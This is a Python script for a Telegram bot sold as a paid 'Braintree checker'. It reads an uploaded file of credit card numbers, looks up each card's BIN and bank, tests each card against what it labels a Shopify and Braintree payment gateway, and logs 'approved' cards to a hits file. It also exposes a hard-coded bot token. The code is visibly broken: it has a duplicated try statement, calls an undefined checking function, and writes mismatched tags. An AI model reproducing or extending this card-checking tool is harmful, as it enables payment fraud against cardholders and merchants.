import requests,re
from hh import keep_alive
try:
try:
    import telebot
except:
    import os
    os.system("pip install pyTelegramBotAPI")
from telebot import *
from colorama import Fore
sto = {"stop":False}
token = "7336963132:AAGMtGcbSBt0XGkMKi8aMhZOGFWZH5s0K8Q" 
id = 6191863486 
bot=telebot.TeleBot(token,parse_mode="HTML")
@bot.message_handler(commands=["stop"])
def start(message):
    sto.update({"stop":False})
    bot.reply_to(message,'𝐼 𝑠𝑡𝑜𝑝𝑝𝑒𝑑 𝑡𝒉𝑒 𝑐𝑜𝑚𝑏𝑜 𝑓𝑜𝑟 𝑦𝑜𝑢, 𝑤𝑖𝑡𝒉 𝑦𝑜𝑢𝑟 𝑝𝑒𝑟𝑚𝑖𝑠𝑠𝑖𝑜𝑛. 𝑊𝑎𝑖𝑡 10𝑠')
@bot.message_handler(commands=["start"])
def start(message):
    sto.update({"start":False})
    bot.reply_to(message,'╔═══════════════\n╟✅𝗕𝗿𝗮𝗶𝗻𝘁𝗿𝗲𝗲 𝗕𝗼𝘁 𝗔𝗰𝗰𝗲𝘀𝘀   ⚡️ \n╚═══════════════\n╔═══════════════\n╟✅7️⃣ 𝗗𝗮𝘆 10$ 💸 \n╚═══════════════\n╔═══════════════\n╟✅1️⃣5️⃣ 𝗗𝗮𝘆 12$💸 \n╚═══════════════\n╔═══════════════\n╟✅3️⃣0️⃣ 𝗪𝗲𝗲𝗸 20$  💸 \n╚═══════════════\n╔═══════════════\n╟https://t.me/ownerxxxx/4\n╚═══════════════\n╔═══════════════\n╟✅𝗦𝗼𝘂𝗿𝗰𝗲 𝗖𝗼𝗱𝗲 𝗕𝘆 @Ownerxxxxx CH. @CHITNGE54 \n╚═══════════════')
@bot.message_handler(commands=["ktart"])
def start(message):
 bot.send_message(message.chat.id,"   \n.Working Bot။\n Send Combo file ".format(message.chat.first_name),reply_markup=telebot.types.InlineKeyboardMarkup())
@bot.message_handler(content_types=["document"])
def main(message):
 first_name = message.from_user.first_name
 last_name = message.from_user.last_name
 name=f"{first_name} {last_name}"
 risk=0
 bad=0
 nok=0
 ok = 0
 ko = (bot.reply_to(message,f" NOW START...⌛").message_id)
 ee=bot.download_file(bot.get_file(message.document.file_id).file_path)
 with open("combo.txt","wb") as w:
     w.write(ee)
 print(message.chat.id)
 sto.update({"stop":True})
 if message.chat.id == id:
      with open("combo.txt") as file:
       lino = file.readlines()
       lino = [line.rstrip() for line in lino]
       total = len(lino)
       for cc in lino:
           if sto["stop"] == True:
               pass
           else:
               break
           bin=cc[:6]
           url=f"https://lookup.binlist.net/{bin}"
           try:
            req=requests.get(url).json()
           except:
            pass
           try:
            inf = req['scheme']
           except:
            inf = "------------"
           try:
            type = req['type']
           except:
            type = "-----------"
           try:
            brand = req['brand']
           except:
            brand = '-----'
           try:
            info = inf + '-' + type + '-' + brand
           except:
            info = "CREDIT-CORPORATE"
           try:
            ii = info.upper()
           except:
            ii = "----------"
           try:
            bank = req['bank']['name'].upper()
           except:
            bank = "CAPITAL ONE"
           try:
            do = req['country']['name'] + ' ' + req['country']['emoji'].upper()
           except:
            do = "-----------"
           mes = types.InlineKeyboardMarkup(row_width=1)
           GALD1 = types.InlineKeyboardButton(f"↳{cc} ",callback_data='u8')
           GALD2 = types.InlineKeyboardButton(f"↳𝖲𝗍𝖺𝗍𝗎𝗌 :  Status code 2107: Card Not Activated (14 : INV ACCT NUM) ",callback_data='u1')
           GALD3 = types.InlineKeyboardButton(f"↳𝖠𝖯𝖯𝖱𝖮𝖵𝖤𝖣 💸 : [ {ok} ] •",callback_data='u2')
           GALD4 = types.InlineKeyboardButton(f"↳𝖣𝖾𝖼𝗅𝗂𝗇𝖾𝖽 🔴  : [ {bad} ] •",callback_data='u1')
           risk6 = types.InlineKeyboardButton(f"↳Your card does not support [ 1  ]",callback_data='u1')
           GALD5 = types.InlineKeyboardButton(f"↳𝖳𝖮𝖳𝖠𝖫    : [ {total} ] ",callback_data='u1')
           GALD6 = types.InlineKeyboardButton(f"↳STOP ❎",callback_data='u1')
           mes.add(GALD1,GALD2,GALD3,GALD4,risk6,GALD5,GALD6)
           bot.edit_message_text(chat_id=message.chat.id,message_id=ko,text=f''' Braintree CHECKING Wait for Result...⏳ 
    ''',parse_mode='markdown',reply_markup=mes)

           try:
             last = str(Tele(cc))
           except Exception as e:
               print(e)
               try:
                  last = str(Tele(cc))
               except Exception as e:
                  print(e)
                  bot.reply_to(message,f"")
           if "risk" in last:
            risk += 1
            print(Fore.YELLOW+cc+"->"+Fore.CYAN+last)
           elif "Insufficient Funds" in last:
               ok +=1
               respo = f'''
!! 𝘛𝘳𝘢𝘯𝘴𝘢𝘤𝘵𝘪𝘰𝘯: 🟢
𝘎𝘢𝘵𝘦𝘸𝘢𝘺 : Shopify + Braintree

𝘊𝘊 : <code>{cc}</code>
𝘚𝘵𝘢𝘵𝘶𝘴 : <code>Approved ✅ </code>
𝘙𝘦𝘴𝘶𝘭𝘵 -» <code>Insufficient Funds</code>

↳𝖡𝖨𝖭 𝖨𝖭𝖥𝖮 : <code>{ii}</code>
↳𝖡𝖺𝗇𝗄 : <code>{bank}</code>
↳𝖢𝗈𝗎𝗇𝗍𝗋𝗍 : <code>{do}</code>

Dev : <code>@ChitNgexx 🇲🇲</code>
'''
               print(Fore.YELLOW+cc+"->"+Fore.GREEN+last)
               bot.reply_to(message,respo)
               with open("hit.txt", "a") as f:
                f.write(f'''
!! 𝘛𝘳𝘢𝘯𝘴𝘢𝘤𝘵𝘪𝘰𝘯: 🟢
𝘎𝘢𝘵𝘦𝘸𝘢𝘺 : Shopify + Braintree

𝘊𝘊 : {cc}
𝘚𝘵𝘢𝘵𝘶𝘴 : Approved ✅ 5$
𝘙𝘦𝘴𝘶𝘭𝘵 -» Card Issuer Declined CVV(2010)

↳𝖡𝖨𝖭 𝖨𝖭𝖥𝖮 : {ii}
↳𝖡𝖺𝗇𝗄 : {bank}
↳𝖢𝗈𝗎𝗇𝗍𝗋𝗍 : {do}

Dev : <code>@ChitNgexx 🇲🇲
''')
           elif "Status code avs: Gateway Rejected: avs" in last or "Nice! New payment method added:" in last or "Status code 81724: Duplicate card exists in the vault." in last:
               ok += 1
               respo = (f'''
!! 𝘛𝘳𝘢𝘯𝘴𝘢𝘤𝘵𝘪𝘰𝘯: 🟢
𝘎𝘢𝘵𝘦𝘸𝘢𝘺 : Shopify + Braintree

𝘊𝘊 : <code>{cc}</code>
𝘚𝘵𝘢𝘵𝘶𝘴 : <code>Approved ✅ 5$</code>
𝘙𝘦𝘴𝘶𝘭𝘵 -» <code>Approved (1000) </code>

↳𝖡𝖨𝖭 𝖨𝖭𝖥𝖮 : <code>{ii}</code>
↳𝖡𝖺𝗇𝗄 : <code>{bank}</code>
↳𝖢𝗈𝗎𝗇𝗍𝗋𝗍 : <code>{do}</code>

Dev : <code>@ChitNgexx 🇲🇲</code>
''')
               print(Fore.YELLOW+cc+"->"+Fore.GREEN+last)
               bot.reply_to(message,respo)
               with open("hit.txt", "a") as f:
                f.write(f'''
!! 𝘛𝘳𝘢𝘯𝘴𝘢𝘤𝘵𝘪𝘰𝘯: 🟢
𝘎𝘢𝘵𝘦𝘸𝘢𝘺 : Shopify + Braintree

𝘊𝘊 : <l{cc}
𝘚𝘵𝘢𝘵𝘶𝘴 : Approved ✅ 5$</code>
𝘙𝘦𝘴𝘶𝘭𝘵 -» Card Issuer Declined CVV(2010) 

↳𝖡𝖨𝖭 𝖨𝖭𝖥𝖮 : {ii}
↳𝖡𝖺𝗇𝗄 : {bank}
↳𝖢𝗈𝗎𝗇𝗍𝗋𝗍 : {do}

Dev : @ChitNgexx 🇲🇲
''')
           else:
                   bad +=1
                   print(Fore.YELLOW+cc+"->"+Fore.RED+last)
       if sto["stop"] == True:
           bot.reply_to(message,'Now Stop')
 else:
     bot.reply_to(message,'╔═══════════════\n╟𝗬𝗼𝘂 𝗡𝗼𝘁 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗨𝘀𝗲𝗿 😢😢\n╚═══════════════\n╔═══════════════\n╟𝗣𝗮𝗶𝗱 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗣𝗹𝗮𝗻\n╚═══════════════\n╔═══════════════\n╟𝗖𝗵𝗲𝗰𝗸 𝗩𝗶𝗽 𝗖𝗼𝗺𝗺𝗮𝗻𝗱  /vip \n╚═══════════════\n @ChitNgexx')
print("STARTED BOT @ChitNgexx")
bot.infinity_polling()
